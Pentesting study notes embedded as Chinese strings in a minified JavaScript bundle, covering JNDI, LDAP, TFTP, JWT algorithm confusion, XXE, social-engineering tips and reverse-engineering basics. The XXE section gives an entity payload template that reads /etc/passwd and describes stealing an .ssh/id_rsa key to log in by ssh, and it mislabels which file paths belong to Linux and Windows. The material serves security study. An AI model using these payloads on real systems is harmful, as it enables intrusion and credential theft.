                  \u5F88\u591A\u4EBA\u63A5\u89E6JNDI\uFF0C\u662F\u4ECE\u6570\u636E\u5E93\u7684\u9A71\u52A8\u5F00\u59CB\u7684\u3002
                      \u5F53\u7136\uFF0C\u968F\u7740SpringBoot\u5355\u4F53\u53D1\u5E03\u6A21\u5F0F\u7684\u6D41\u884C\uFF0C\u73B0\u5728\u7528\u8FD9\u79CD\u65B9\u5F0F\u6765\u83B7\u53D6\u6570\u636E\u5E93\u914D\u7F6E\u7684\u53E4\u8463\u516C\u53F8\uFF0C\u662F\u8D8A\u6765\u8D8A\u5C11\u4E86\u3002

                      \u4E60\u60EF\u7528\u300Axml\u300B\u7684\u3010<Resource>\u3011\u6807\u7B7E\uFF0C\u53BB\u8FDB\u884C\u52A0\u8F7D

                  \u66F4\u591A\u62D3\u5C55\uFF0CJNDI\u901A\u8FC7SPI\u673A\u5236\uFF0C\u53EF\u4EE5\u548CLDAP\u3001RMI\u7B49\u5404\u79CD\u6280\u672F\uFF0C\u4EA7\u751F\u8054\u52A8\u3002
                      \u3010SPI\u673A\u5236\u3011
                          SPI\u662F\u4E3A\u6570\u4E0D\u591A\u7684\u6253\u7834Java\u7C7B\u52A0\u8F7D\u673A\u5236\u7684\u6280\u672F\uFF0C\u548CUnsafe\u7C7B\u4E00\u6837\uFF0C\u5F3A\u5927\u4F46\u5E76\u4E0D\u90A3\u4E48\u63A8\u8350\u4F7F\u7528\u3002
                              \u4E3E\u4F8B\uFF1A
                                  \u5C31\u662FNamingManager\u7C7B\u91CC\u9762\u7684\u65B9\u6CD5getObjectFactoryFromReference\u3002
                                      \u5F53\u5B83\u4ECE\u672C\u5730\u52A0\u8F7D\u76F8\u5E94\u7C7B\u7684\u65F6\u5019\uFF0C\u5982\u679C\u52A0\u8F7D\u4E0D\u5230\uFF0C\u5B83\u5E72\u4E86\u4E00\u4EF6\u4E0D\u8BE5\u5E72\u4F46\u53C8\u4E0D\u5F97\u4E0D\u5E72\u7684\u4E8B\u60C5\uFF0C
                                          \u90A3\u5C31\u662F\u4ECE\u7F51\u7EDC\u4E0A\u7684\u4EE3\u7801\u91CC\u9762\u6784\u9020\u76F8\u5E94\u7684\u5BF9\u8C61\uFF01

          `))},{name:"\u3010JNDI\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          JNDI
              Java Naming and Directory Interface API .

              \u901A\u8FC7\u8C03\u7528\u6B64 API\uFF0C\u5E94\u7528\u7A0B\u5E8F\u53EF\u4EE5\u5B9A\u4F4D\u8D44\u6E90\u548C\u5176\u4ED6\u7A0B\u5E8F\u5BF9\u8C61\u3002
                  \u8D44\u6E90\u662F\u63D0\u4F9B\u4E0E\u7CFB\u7EDF\uFF08\u4F8B\u5982\u6570\u636E\u5E93\u670D\u52A1\u5668\u548C\u6D88\u606F\u4F20\u9012\u7CFB\u7EDF\uFF09\u7684\u8FDE\u63A5\u7684\u7A0B\u5E8F\u5BF9\u8C61\u3002

          \u57FA\u672C\u4F5C\u7528\uFF1A
              JNDI \u5B9E\u73B0\u4F9D\u8D56\u67E5\u627E\uFF0C\u5B9E\u73B0\u4E00\u4E2A\u6700\u7B80\u5355spring
                  \u8D44\u6599\uFF1Ahttps://juejin.cn/post/7006965713491460126

              \u5386\u53F2\u51FA\u73B0\u7684\u539F\u56E0\uFF1A
                  \u8D44\u6599\uFF1Ahttps://juejin.cn/post/6844903917994639368

                  Sun\u5236\u5B9A\u4E86\u3010J2EE\u3011\u89C4\u8303\uFF1A
                      J2EE \u89C4\u8303\u8981\u6C42\u5168\u90E8 J2EE \u5BB9\u5668\u90FD\u8981\u63D0\u4F9B JNDI \u89C4\u8303\u7684\u5B9E\u73B0\u3002
                          //sun \u679C\u7136\u559C\u6B22\u5236\u5B9A\u89C4\u8303
                      JNDI \u5728 J2EE \u4E2D\u7684\u89D2\u8272\u5C31\u662F\u201C\u4EA4\u6362\u673A\u201D \u2014\u2014 J2EE \u7EC4\u4EF6\u5728\u6267\u884C\u65F6\u95F4\u63A5\u5730\u67E5\u627E\u5176\u5B83\u7EC4\u4EF6\u3001\u8D44\u6E90\u6216\u670D\u52A1\u7684\u901A\u7528\u673A\u5236\u3002
                      \u5728\u591A\u6570\u60C5\u51B5\u4E0B\uFF0C\u63D0\u4F9B JNDI \u4F9B\u5E94\u8005\u7684\u5BB9\u5668\u80FD\u591F\u5145\u5F53\u6709\u9650\u7684\u6570\u636E\u5B58\u50A8\u3002
                          \u8FD9\u6837\u7BA1\u7406\u5458\u5C31\u80FD\u591F\u8BBE\u7F6E\u5E94\u7528\u7A0B\u5E8F\u7684\u6267\u884C\u5C5E\u6027\uFF0C\u5E76\u8BA9\u5176\u5B83\u5E94\u7528\u7A0B\u5E8F\u5F15\u7528\u8FD9\u4E9B\u5C5E\u6027\uFF08Java \u7BA1\u7406\u6269\u5C55\uFF08Java Management Extensions\uFF0CJMX\uFF09\u4E5F\u80FD\u591F\u7528\u4F5C\u8FD9\u4E2A\u76EE\u7684\uFF09\u3002
                      JNDI \u5728 J2EE \u5E94\u7528\u7A0B\u5E8F\u4E2D\u7684\u4E3B\u8981\u89D2\u8272\u5C31\u662F\u63D0\u4F9B\u95F4\u63A5\u5C42\uFF0C
                          \u8FD9\u6837\u7EC4\u4EF6\u5C31\u80FD\u591F\u53D1\u73B0\u6240\u987B\u8981\u7684\u8D44\u6E90\uFF0C\u800C\u4E0D\u7528\u4E86\u89E3\u8FD9\u4E9B\u95F4\u63A5\u6027\u3002
                      \u5728 J2EE \u4E2D\uFF0CJNDI \u662F\u628A J2EE \u5E94\u7528\u7A0B\u5E8F\u5408\u5728\u4E00\u8D77\u7684\u7C98\u5408\u5242\u3002
                          JNDI \u63D0\u4F9B\u7684\u95F4\u63A5\u5BFB\u5740\u540C\u610F\u8DE8\u4F01\u4E1A\u4EA4\u4ED8\u53EF\u4F38\u7F29\u7684\u3001\u529F\u80FD\u5F3A\u5927\u4E14\u975E\u5E38\u7075\u6D3B\u7684\u5E94\u7528\u7A0B\u5E8F\u3002
                          \u8FD9\u662F J2EE \u7684\u627F\u8BFA\uFF0C\u5E76\u4E14\u7ECF\u8FC7\u4E00\u4E9B\u8BA1\u5212\u548C\u9884\u5148\u8003\u8651\u3002\u8FD9\u4E2A\u627F\u8BFA\u662F\u5168\u7136\u80FD\u591F\u5B9E\u73B0\u7684\u3002
                  \u6211\u4EEC\u7684\u7406\u89E3\uFF1A
                      JNDI \u63D0\u51FA\u7684\u76EE\u7684\u662F\u4E3A\u4E86\u89E3\u85D5\uFF0C\u662F\u4E3A\u4E86\u5F00\u53D1\u66F4\u52A0easy\u7EF4\u62A4\uFF0Ceasy\u6269\u5C55\u3002easy\u90E8\u7F72\u7684\u5E94\u7528\u3002
                      JNDI \u662F\u4E00\u4E2Asun\u63D0\u51FA\u7684\u4E00\u4E2A\u89C4\u8303(\u76F8\u4F3C\u4E8Ejdbc),\u8BE6\u7EC6\u7684\u5B9E\u73B0\u662F\u5404\u4E2Aj2ee\u5BB9\u5668\u63D0\u4F9B\u5546\u3002sun   \u4EC5\u4EC5\u662F\u8981\u6C42\uFF0Cj2ee\u5BB9\u5668\u5FC5\u987B\u6709JNDI\u8FD9\u79CD\u529F\u80FD\u3002
                      JNDI \u5728j2ee\u7CFB\u7EDF\u4E2D\u7684\u89D2\u8272\u662F\u201C\u4EA4\u6362\u673A\u201D\uFF0C\u662FJ2EE\u7EC4\u4EF6\u5728\u6267\u884C\u65F6\u95F4\u63A5\u5730\u67E5\u627E\u5176\u5B83\u7EC4\u4EF6\u3001\u8D44\u6E90\u6216\u670D\u52A1\u7684\u901A\u7528\u673A\u5236\u3002
                      JNDI \u662F\u901A\u8FC7\u8D44\u6E90\u7684\u540D\u5B57\u6765\u67E5\u627E\u7684\uFF0C\u8D44\u6E90\u7684\u540D\u5B57\u5728\u6574\u4E2Aj2ee\u5E94\u7528\u4E2D(j2ee\u5BB9\u5668\u4E2D)\u662F\u552F\u4E00\u7684\u3002



          \u91CD\u8981\u6982\u5FF5\uFF1A
              \u3010SPI\u3011




          `))},{name:"\u3010LDAP\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          LDAP
          389
              Lightweight Directory Access Protocol

              \u4E00\u79CD\u5F00\u653E\u7684\u3001\u4F9B\u5E94\u5546\u4E2D\u7ACB\u7684\u3001\u884C\u4E1A\u6807\u51C6\u5E94\u7528\u534F\u8BAE\uFF0C\u7528\u4E8E\u901A\u8FC7 Internet \u6216\u7F51\u7EDC\u8BBF\u95EE\u548C\u7EF4\u62A4\u5206\u5E03\u5F0F\u76EE\u5F55\u4FE1\u606F\u670D\u52A1\u3002


          `))},{name:" \u548C   \u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`





          `))},pu]},Mu=Tu,ju=pu,Ju=n("yEy/"),te=g.l.singleATag_blank,Lu={name:"\u3010\u793E\u4F1A\u5DE5\u7A0B\u5B66\u3011_\u3010\u5FC3\u7406\u5B66\u3011_\u4EBA\u7684\u56E0\u7D20_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5173\u4E8E\u5BC6\u7801
              1\xB7 \u4EBA\u4EEC\u5E38\u5E38\u4F1A\u4F7F\u7528\u3010\u540C\u6837\u7684\u5BC6\u7801\u3011\u3002
              2. \u4EBA\u4EEC\u7ECF\u5E38\u3010\u590D\u7528\u5BC6\u7801\u3011\u7684\u5927\u90E8\u5206\uFF0C\u4EC5\u5C06\u3010\u5E74\u4EFD2018\u3011\u7B49\u7684\u5B57\u7B26\u6539\u53D8\u3002
                      \u624B\u52A8\u4FEE\u6539 \u4E3A\uFF1A  2019\u30012020\u30012021\u30012022

          `))},{name:"\u5E38\u89C1\u9632\u5FA1\u624B\u6BB5 \uFF08\u6211\u4EEC\u653B\u53EF\u4EE5 \u53CD\u5176\u9053\u800C\u884C\u4E4B\uFF09",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4E2A\u4EBA\u5B89\u5168\u6E05\u5355\uFF1A
              \u30102022\u5E74\uFF0C\u4FDD\u62A4\u6570\u5B57\u5B89\u5168\u548C\u9690\u79C1\u7684\uFF0C300 \u591A\u4E2A\u63D0\u793A\u7684\u7CBE\u9009\u6E05\u5355\u3011
                  \u5730\u5740\uFF1A
                      https://github.com/Lissy93/personal-security-checklist
                  \u4ECB\u7ECD\uFF1A
                      \u5728\u73B0\u4EE3\u7F51\u7EDC\u65F6\u4EE3\u4FDD\u62A4\u6570\u5B57\u5B89\u5168\u548C\u9690\u79C1\u7684 300 \u591A\u4E2A\u63D0\u793A\u7684\u7CBE\u9009\u6E05\u5355\u3002\u4ECE\u8EAB\u4EFD\u9A8C\u8BC1\u3001\u6D4F\u89C8\u3001\u793E\u4EA4\u5A92\u4F53\u548C\u7535\u5B50\u90AE\u4EF6\u5230\u624B\u673A\u3001\u5B89\u5168\u6D88\u606F\u4F20\u9012\u548C\u667A\u80FD\u5BB6\u5C45\uFF0C\u5E94\u6709\u5C3D\u6709\u3002
          `))},{name:"\u5386\u53F2\u4E66\u7C4D",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u300A\u4E8C\u5341\u4E16\u7EAA\u6700\u5927\u7684\u9A97\u5B50\u300B

              \u62C9\u65AF\u8482\u683C\u5341\u8BEB

                  \u4E00\u3001\u505A\u4E2A\u6709\u8010\u5FC3\u7684\u503E\u542C\u8005
                  \u4E8C\u3001\u6C38\u8FDC\u4E0D\u8981\u88AB\u4EBA\u770B\u8D77\u6765\u65E0\u804A
                  \u4E09\u3001\u4E0D\u8981\u5148\u900F\u9732\u4EFB\u4F55\u653F\u6CBB\u89C2\u70B9  \u7B49\u5BF9\u65B9\u5148\u8BF4  \u7136\u540E\u8D5E\u540C
                  \u56DB\u3001\u7B49\u5F85\u5BF9\u65B9\u8868\u660E\u5B97\u6559\u89C2\u70B9  \u7136\u540E\u8D5E\u540C
                  \u4E94\u3001\u505A\u6697\u793A\u6027\u8C08\u8BDD  \u4E0D\u8981\u6025\u7740\u8DDF\u8FDB  \u9664\u975E\u5BF9\u65B9\u6709\u5F3A\u70C8\u7684\u5174\u8DA3
                  \u516D\u3001\u6C38\u8FDC\u4E0D\u8981\u8C08\u8BBA\u75BE\u75C5  \u538B\u6291\u7684\u6C14\u6C1B\u65E0\u6CD5\u542F\u53D1\u8D2A\u5A6A
                  \u4E03\u3001\u6C38\u8FDC\u4E0D\u8981\u7AA5\u63A2\u5BF9\u65B9\u7684\u4E2A\u4EBA\u60C5\u51B5  \u4ED6\u4EEC\u6700\u7EC8\u90FD\u4F1A\u544A\u8BC9\u4F60
                  \u516B\u3001\u6C38\u8FDC\u4E0D\u8981\u5439\u5618  \u8BA9\u81EA\u5DF1\u7684\u91CD\u8981\u6027\u6084\u6084\u7684\u663E\u800C\u6613\u89C1
                  \u4E5D\u3001\u6C38\u8FDC\u4E0D\u8981\u51CC\u4E71  \u65E0\u8BBA\u5916\u8868\u8FD8\u662F\u5FC3\u6001
                  \u5341\u3001\u505A\u751F\u610F\u671F\u95F4  \u5343\u4E07\u4E0D\u80FD\u559D\u9189

          \u300A\u7279\u52A1\u5DE5\u4F5C\u4E4B\u7406\u8BBA\u4E0E\u5B9E\u9645\u300B
                  PDF\u5730\u5740\uFF1Ahttps://taiwanebook.ncl.edu.tw/zh-tw/book/NCL-9900010638/reader



          `))}]},zu=Lu,ie=g.l.singleATag_blank,bu={name:"\u3010TFTP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4F7F\u7528",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  69
  TFTP


      \u4ECB\u7ECD\uFF1A

          Trivial File Transfer Protocol
              \u666E\u901A\u7410\u788E \u7684 \u6587\u4EF6 \u4F20\u8F93 \u534F\u8BAE

          \u7B80\u5355\u7684\u534F\u8BAE
              \u5B83\u63D0\u4F9B \u3010\u65E0\u9700\u7528\u6237\u8BA4\u8BC1\u3011\u7684\u57FA\u672C\u6587\u4EF6\u4F20\u8F93\u529F\u80FD\u3002

          TFTP \u9002\u7528\u4E8E\u4E0D\u9700\u8981\u3010FTP\u3011\u63D0\u4F9B\u7684\u590D\u6742\u4EA4\u4E92\uFF0C\u7684\u573A\u666F

          TFTP \u4F7F\u7528\u7528\u6237\u6570\u636E\u62A5\u534F\u8BAE (UDP) \u8FDB\u884C\u901A\u4FE1
              \u8FD9\u88AB\u5B9A\u4E49\u4E3A\uFF0C\u5728 IP \u4E4B\u4E0A\u5DE5\u4F5C\u7684\u8F7B\u91CF\u7EA7\u6570\u636E\u4F20\u8F93\u534F\u8BAE\u3002

              \u3010UDP\u3011\u4E5F\u6709\u50CF\u3010TCP\u3011\u4E00\u6837\u7684\u3010\u7AEF\u53E3\u3011\u5B9A\u4E49\u3002

          tftpd-hpa

      \u5E38\u89C1\u914D\u7F6E\uFF1A

          \u8D44\u6599\uFF1Ahttps://help.ubuntu.com/community/TFTP#Installation

          \u5B58\u50A8\u8DEF\u5F84\uFF1A
              \u4E00\u822C\uFF0C\u662F\u3010TFTP\u7528\u6237\u3011\u7684\u3010Home\u76EE\u5F55\u3011

                  \u4E3E\u4F8B\uFF0C\u6BD4\u5982\u3010/var/lib/tftpboot\u3011

                  \u53EF\u4EE5\u5C1D\u8BD5\uFF0C\u5047\u8BBE\u3010\u8FD9\u4E2A\u76EE\u5F55\u3011\u5C31\u662F\u3010\u4E0A\u4F20\u4E0B\u8F7D\u3011\u7684\u3010\u5B58\u50A8\u8DEF\u5F84\u3011\u3002

          \u914D\u7F6E\u6587\u4EF6\uFF1A
              \u9ED8\u8BA4\u4E3A\u3010/etc/default/tftpd-hpa\u3011\u3002

      \u547D\u4EE4

          \u767B\u5F55

              \u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0CTFTP \u65E0\u9700\u8EAB\u4EFD\u9A8C\u8BC1\u5373\u53EF\u5DE5\u4F5C\u3002

              tftp  <IP\u5730\u5740>

          \u6267\u884C

              \u5E2E\u52A9
                  \u3010?\u3011\uFF0C\u67E5\u770B\u5185\u90E8\u5E2E\u52A9

              \u8FDE\u63A5
                  \u3010connect\u3011

                  \u3010status\u3011
                      \u67E5\u770B\u5F53\u524D\u72B6\u6001


              \u5217\u8868
                  \u6CA1\u6709\u3010\u5217\u8868\u3011\u6307\u4EE4\u3002\u9760\u76F2\u6253\u3002

              \u4F20\u8F93
                  \u3010get\u3011
                  \u3010put\u3011

              \u4F20\u8F93\u6A21\u5F0F
                  \u3010mode\u3011
                      \u53EF\u4EE5\u662F ascii \u6216 binary \u3002\u9ED8\u8BA4\u4E3A\u3010ascii\u3011

                  \u3010ascii\u3011\uFF0C\u7B80\u5199

                  \u3010binary\u3011\uFF0C\u7B80\u5199

              \u9000\u51FA
                  \u3010quit\u3011

          `))}]},_u=bu,Vu=n("FOD2"),ae=g.l.singleATag_blank,ue={name:"\u3010JWT\u3011_\u624B\u518C",steps:[{name:"\u3010JWT\u3011\u3001\u3010jsonwebtoken\u3011\u3001",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          \u3010jsonwebtoken\u3011\u5B58\u5728\u7684\u6F0F\u6D1E

              \u8D44\u6599\uFF1Ahttps://snyk.io/test/npm/jsonwebtoken/4.0.0#npm:jsonwebtoken:20150331

              \u8FC7\u7A0B\uFF1A
                  1. \u671F\u5F85\u201CRSA\u201D\uFF08\u516C\u94A5-\u79C1\u94A5\u65B9\u6848\uFF09\uFF0C\u4F46\u63A5\u6536\u201CHSA256\u201D\uFF08\u5BF9\u79F0\u5BC6\u94A5\u65B9\u6848\uFF09\uFF1B\u653B\u51FB\u8005\u53EF\u4EE5\u4F7F\u7528\u66F4\u65B0\u7684\u201Calg\u201D\u8F7B\u677E\u4F2A\u9020\u4EE4\u724C
                  2. \u5C06\u91CD\u65B0\u4F7F\u7528\u7684\u516C\u94A5\u4F5C\u4E3A\u9A8C\u8BC1\u5BC6\u94A5\u76F2\u76EE\u4F20\u9012\u7ED9\u670D\u52A1\u5668\u7AEF\u9A8C\u8BC1\u65B9\u6CD5\uFF0C\u6DF7\u6DC6\u5DF2\u77E5\u516C\u94A5\u4F5C\u4E3A HS256 \u7684\u9A8C\u8BC1\u5BC6\u94A5

          \u9776\u673A\u8BE6\u89E3\uFF1A
              HTB - Under Construction\uFF1A
                  https://www.wulfgar.pro/hackthebox-under-construction/
                      \u56E0\u4E3A\u6709\u4E00\u5B9A\u7406\u89E3\u96BE\u5EA6\uFF0C\u6240\u4EE5\u53EF\u4EE5\u591A\u8BFB\u51E0\u904D

          \u68C0\u67E5JWT
              https://jwt.io/

              \u539F\u7406\uFF1A
                  \u53C2\u8003\u8D44\u6599\uFF1Ahttps://www.cnblogs.com/snowie/p/14689894.html
                      \u5728\u3010JWTHelper.js\u3011\u6587\u4EF6\u4E2D\uFF0C\u3010decode\u3011\u73AF\u8282\uFF0C\u652F\u6301\u4E86\u3010\u4E24\u79CD\u7B97\u6CD5\u3011\u2014\u2014RS256 + HS256

                  \u3010RS256\u3011\u548C\u3010HS256\u3011\uFF0C\u4E24\u79CD\u7B97\u6CD5\u7684\u88AB\u6DF7\u6DC6
                  \u524D\u8005\uFF0C\u662F\u3010\u975E\u5BF9\u79F0\u7B97\u6CD5\u3011\uFF0C\u6709\u4E24\u79CD\u5BC6\u94A5\u4E00\u5BF9\uFF1B    \u540E\u8005\uFF0C\u662F\u3010\u5BF9\u79F0\u7B97\u6CD5\u3011\uFF0C\u6709\u4E00\u4E2A\u5BC6\u94A5

                  \u5C06\u3010RS256\u3011\u7684\u3010\u516C\u94A5\u3011\uFF0C\u4F5C\u4E3A\u3010HS256\u3011\u7684\u3010\u552F\u4E00\u5BC6\u94A5\u3011

          jwt_tool
              \u8D44\u6599\uFF1Ahttps://github.com/ticarpi/jwt_tool

          jwt_forge.py
              \u8D44\u6599\uFF1Ahttps://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20

          Python\u7684\u3010jwt\u3011\u6A21\u5757
              jwt.encode()
                  \u5982\u679C\u5BF9\u3010\u516C\u94A5\u7C7B\u578B\u3011\u6709\u9650\u5236\uFF0C\u4FEE\u6539\u3010\u6A21\u5757\u6E90\u4EE3\u7801\u3011\u653E\u5F00\u9650\u5236\u5373\u53EF

          Header\uFF0C\u5305\u542B\u3010\u57FA\u672C\u52A0\u5BC6\u7C7B\u578B\u3011\u7B49\u57FA\u672C\u4FE1\u606F

          Payload\uFF0C\u643A\u5E26\u7684\u3010\u81EA\u5B9A\u4E49JSON\u3011\u4FE1\u606F\u3002

          Signature\u7B7E\u540D\uFF0C\u6307\u3010Header + Payload + Private\u3011\uFF0C\u7528\u3010\u70B9\u53F7\u3011\u62FC\u63A5\u540E\uFF0C\u518D\u8D70\u4E00\u904D\u52A0\u5BC6


          \u9488\u5BF9\u573A\u666F\uFF1A
              \u5185\u7F6ESQL\u67E5\u8BE2\uFF0C\u5F15\u7528\u4E86\u3010Payload\u3011\u4E2D\u5185\u7F6E\u7684\u53C2\u6570\u3001\u53D8\u91CF\u3002
                  \u800C\u8FD9\u4E00\u70B9\uFF0C\u6070\u6070\u6709\u53EF\u80FD \u89E6\u53D1sql\u6CE8\u5165

              \u5BFC\u81F4\uFF1A
                  1. \u65E0\u6CD5\u901A\u8FC7\u7B80\u5355\u4F20\u53C2\u89E3\u51B3\u3002\uFF08\u4E0D\u63A5\u53D7\u5916\u90E8\u4F20\u53C2\uFF09
                  2. \u5982\u679C\u5728Session\u4E2D\u4F20\uFF0C\u9700\u8981\u3010\u79C1\u94A5\u4E8C\u6B21\u52A0\u5BC6\u3011\uFF0C\u624D\u80FD\u5F62\u6210Session\u4E32\u3002

              \u6B64\u65F6\uFF0C\u5C31\u9700\u8981\u3010jwt_tool\u3011\u7B49\u5DE5\u5177\uFF0C\u5B9E\u73B0\u3010\u4E8C\u6B21\u52A0\u5BC6\u3011\u6B3A\u9A97\u3002


          \u3010sqlmap\u3011\u7684\u3010tamper\u3011\u811A\u672C\uFF0C\u4F7F\u7528\uFF1A
              \u8D44\u6599\uFF1Ahttps://www.cnblogs.com/snowie/p/14689894.html



          `))}]},ce=ue,Ru=g.l.singleATag_blank,xu={name:"\u3010XXE\u3011_\u3010XEE\u3011_\u624B\u518C",steps:[{name:"\u3010XXE\u3011\u3001\u3010XEE\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u4ECB\u7ECD\uFF1A
              \u5916\u90E8\u5B9E\u4F53\u653B\u51FB
              \u5BF9\u5916\u90E8\u5B9E\u4F53\u7684\u5F15\u7528\u7684 XML \u8F93\u5165\u7531\u5F31\u914D\u7F6E\u7684 XML \u89E3\u6790\u5668\u5904\u7406\u65F6\uFF0C\u5C31\u4F1A\u53D1\u751F\u8FD9\u79CD\u653B\u51FB\u3002

                  \u653B\u51FB\u53EF\u80FD\u5BFC\u81F4\u673A\u5BC6\u6570\u636E\u6CC4\u9732\u3001\u62D2\u7EDD\u670D\u52A1\u3001\u670D\u52A1\u5668\u7AEF\u8BF7\u6C42\u4F2A\u9020\u3001\u4ECE\u89E3\u6790\u5668\u6240\u5728\u673A\u5668\u7684\u89D2\u5EA6\u8FDB\u884C\u7AEF\u53E3\u626B\u63CF\u7B49\u7CFB\u7EDF\u5F71\u54CD\u3002

          \u8D44\u6599\uFF1A
              https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
              https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity


          Content-Type: text/xml

          \u5229\u7528\uFF1A
              Linux\uFF1A
                  \u3010C:\\windows\\system32\\drivers\\etc\\hosts\u3011
              Windows\uFF1A
                  \u3010file:///etc/passwd\u3011

              \u57FA\u672C\u64CD\u4F5C\uFF1A
                  <!--?xml version="1.0" ?-->
                  <!DOCTYPE  <\u8FD9\u662F\u5565\u5440>  [<!ENTITY  <\u81EA\u5B9A\u4E49\u53D8\u91CF\u540DvarA>  SYSTEM  file:///<\u5177\u4F53\u6587\u4EF6\u5730\u5740>  > ]>
                  <data> &<\u81EA\u5B9A\u4E49\u53D8\u91CF\u540DvarA>; </data>


                      \u4F3C\u4E4E\u3010file:///\u3011\uFF0C\u53EF\u8981\u53EF\u4E0D\u8981\uFF1F\uFF1F\uFF1F

                      \u3010\u5177\u4F53\u6587\u4EF6\u5730\u5740\u3011\uFF0C\u65E0\u8BBA Windows \u3001 Linux\uFF0C\u90FD\u8981\u3010\u6B63\u659C\u6760\u3011  \u4E0D\u80FD\u7528\u3010\u53CD\u659C\u6760\u3011\u3002

          \u8BFB\u53D6\u3010.ssh\u3011
              \u3010C:/users/daniel/.ssh/id_rsa\u3011

              \u8BFB\u53D6\u5230\u4E4B\u540E\uFF0C\u4FDD\u5B58\u4E3A\u672C\u5730\u6587\u4EF6\u3010id_rsa\u3011

              \u4E3A\u3010id_rsa\u3011\u6587\u4EF6\uFF0C\u8BBE\u7F6E\u6743\u9650
                  chmod  400  <\u6587\u4EF6\u540D>

              \u767B\u5F55
                  ssh  -i  <\u5BC6\u94A5\u6587\u4EF6>  <\u7528\u6237\u540D>@<IP\u5730\u5740>



          \u3010docx\u3011\u4E0E\u3010\u538B\u7F29\u5305\u3011\uFF0C\u76F8\u5173\u7684\u3010XXE\u3011
              https://xz.aliyun.com/t/11203


          `))}]},Zu=xu,ku=g.l.singleATag_blank,ee={name:`____\u624B\u518C
\u3010exe\u3011\u3001\u3010\u53EF\u6267\u884C\u6587\u4EF6\u3011\u3001
\u3010pwn\u3011\u3001
\u3010\u9006\u5411\u3011\u3001\u3010\u9006\u5411\u5DE5\u7A0B\u3011\u3001\u3010REVERSE ENGINEERING\u3011\u3001
\u3010\u53CD\u7F16\u8BD1\u3011\u3001\u3010decompile\u3011\u3001
\u3010\u6C47\u7F16\u3011\u3001\u3010ASM\u3011\u3001\u3010assemble\u3011\u3001
\u3010\u4E8C\u8FDB\u5236\u3011\u3001\u3010binary\u3011\u3001
\u3010Windows\u3011\u3001\u3010Linux\u3011\u3001
  `,steps:[{name:"\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5E38\u89C1\u6307\u4EE4\uFF1A

              \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u6587\u4EF6\u7C7B\u578B\u3011
                  file      <\u4E8C\u8FDB\u5236\u6587\u4EF6>

              \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u5185\u5B58\u4FDD\u62A4\u3011
                  checksec  <\u4E8C\u8FDB\u5236\u6587\u4EF6>


          ELF\u6587\u4EF6

              123


          NX
              Non-Executable
              \u610F\u601D\u662F\u5F53\u5E94\u7528\u7A0B\u5E8F\u8FD0\u884C\u5E76\u52A0\u8F7D\u5230\u5185\u5B58\u4E2D\u65F6\uFF0C\u4E0D\u5141\u8BB8\u8FD9\u4E9B\u6BB5\u65E2\u53EF\u5199\u53C8\u53EF\u6267\u884C


          RELRO
              \u662F Relocation Read-Only \u7684\u9996\u5B57\u6BCD\u7F29\u5199

              \u8FD9\u610F\u5473\u7740\u7528\u4E8E\u5141\u8BB8\u52A8\u6001\u94FE\u63A5\u5668\u52A0\u8F7D\u548C\u94FE\u63A5\u7B26\u53F7\u7684\u5168\u5C40\u504F\u79FB\u8868\uFF08GOT\uFF09\u88AB\u6807\u8BB0\u4E3A\u53EA\u8BFB\u3002

          PLT\u3001GOT
              \u5168\u5C40\u504F\u79FB\u8868 (GOT) \u7531.got\u548C.got.plt\u90E8\u5206\u7EC4\u6210\u3002
                  \u8BE5.got\u6BB5\u4FDD\u5B58 libc \u4E2D\u51FD\u6570\u7684\u5730\u5740\u3002
                  GOT \u4E2D\u7684\u5730\u5740\u5728\u7A0B\u5E8F\u8FD0\u884C\u65F6\u7531\u52A8\u6001\u94FE\u63A5\u5668\u52A8\u6001\u586B\u5145\u3002
                  \u3010.got.plt\u3011\u6301\u6709.got\u5BF9\u6BCF\u4E2A\u7B26\u53F7\u7684\u5F15\u7528\u3002

